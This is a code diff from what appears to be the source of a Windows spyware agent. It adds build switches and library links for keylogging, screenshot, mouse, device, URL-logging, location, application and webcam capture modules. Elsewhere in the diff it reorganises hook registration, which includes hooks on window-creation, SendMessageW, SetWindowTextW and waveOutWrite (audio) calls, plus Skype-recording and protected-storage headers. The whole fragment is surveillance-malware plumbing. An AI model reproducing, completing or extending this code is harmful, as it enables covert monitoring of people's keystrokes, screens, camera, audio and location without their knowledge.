@@ -55,6 +55,12 @@
 // modules
 #ifdef __ENABLE_KEYLOG_MODULE
 #include "../modules/keylog/HM_KeyLog.h"
+#pragma comment(lib, "keylog")
+#endif
+
+#ifdef __ENABLE_SCREENSHOT_MODULE
+#include "../modules/screenshot/screenshot.h"
+#pragma comment(lib, "screenshot")
 #endif
 
 // Prototipi usati per comodita'
@@ -65,7 +71,6 @@ void UnlockConfFile();
 /// SECTION for building modules
 
 #ifdef __ENABLE_MONEY_MODULE
-void PM_MoneyRegister();
 #pragma comment(lib, "money")
 #endif
 
@@ -115,22 +120,45 @@ void PM_MoneyRegister();
 
 #if defined(__ENABLE_KEYLOG_MODULE) || defined(__ENABLE_MOUSE_MODULE)
 #pragma comment(lib, "keylog")
+
+#ifdef __ENABLE_MOUSE_MODULE
+#ifndef ENABLE_SCREENSHOT_MODULE
+#pragma error("Error. mouse need screenshot!")
 #endif
+#endif
+
+#endif
+
+
+#if defined(__ENABLE_DEVICE_MODULE)
+#pragma comment(lib, "device")
+#endif
+
+#ifdef __ENABLE_URLWIN32_MODULE
+#pragma comment(lib, "urlwin32")
+#endif
+
+#ifdef __ENABLE_LOCATION_MODULE
+#pragma comment(lib, "location")
+#endif
+
+#ifdef __ENABLE_APPLICATION_MODULE
+#pragma comment(lib, "application")
+#endif
+
+#ifdef __ENABLE_WEBCAM_MODULE
+#pragma comment(lib, "webcam")
+#endif
+
+
 /// SECTION for building modules
 
 #include <json/JSON.h>
 #include "HM_ProcessMonitors.h" // XXX da modificare
-#include "HM_SnapShot.h" // XXX da modificare
-#include "HM_WiFiLocation.h" // XXX da modificare
 void PM_PrintAgentRegister();
 #include "../modules/imagent/HM_SkypeRecord.h"
-#include "HM_UrlLog.h" // XXX da modificare 
-#include "HM_WebCam.h" // XXX da modificare 
-void PM_AmbMicRegister();
-void PM_MailCapRegister();
+#include "../modules/urlwin32/HM_UrlLog.h" // XXX da modificare 
 #include "HM_Pstorage.h" // XXX da modificare 
-extern void PM_IMRegister();	// defined in /modules/imagent
-#include "HM_LogDevice.h" // XXX da modificare 
 
 void PM_SocialAgentRegister();
 
@@ -920,10 +948,12 @@ void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOO
 	HMMAKE_HOOK(dwPid, "SendMessageW", PM_SendMessageURL, SendMessageURLData, PM_SendMessageURL_setup, pServiceData, "user32.dll"); 
 	HMMAKE_HOOK(dwPid, "SetWindowTextW", PM_SetWindowText,  SendMessageURLData, PM_SetWindowText_setup,  pServiceData, "user32.dll"); 
 
+#ifdef __ENABLE_SCREENSHOT_MODULE
 	// --- PM per Snapshot (on window creation)
 	HMMAKE_HOOK(dwPid, "CreateWindowExA", PM_CreateWindowEx, CreateWindowExData, PM_CreateWindowEx_setup, pServiceData, "user32.dll"); 
 	HMMAKE_HOOK(dwPid, "CreateWindowExW", PM_CreateWindowEx, CreateWindowExData, PM_CreateWindowEx_setup, pServiceData, "user32.dll"); 
 	//HMMAKE_HOOK(dwPid, "ShowWindow", PM_ShowWindow, ShowWindowData, PM_ShowWindow_setup, pServiceData, "user32.dll"); 
+#endif
 
 	// --- PM per VOIP
 	HMMAKE_HOOK(dwPid, "waveOutWrite", PM_waveOutWrite, waveOutWriteData, PM_waveOutWrite_setup, pServiceData, "WINMM.dll");
